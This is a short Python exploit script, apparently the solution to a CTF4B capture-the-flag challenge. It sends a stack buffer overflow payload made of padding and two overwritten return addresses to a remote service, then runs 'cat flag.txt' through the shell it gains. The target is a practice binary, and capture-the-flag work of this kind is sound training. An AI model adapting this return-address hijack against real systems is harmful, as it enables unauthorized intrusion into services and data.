import socket
import os
import struct

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = os.getenv('CTF4B_PORT', '9001')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))

payload = b'A' * 0x28
payload += struct.pack('<Q', 0x00400626)
payload += struct.pack('<Q', 0x00400861)
s.send(payload)

for i in range(10):
    if 'Congratulations' in s.recv(4096).decode():
        break

s.send(b"cat flag.txt\n")
print(s.recv(4096).decode())

s.close()
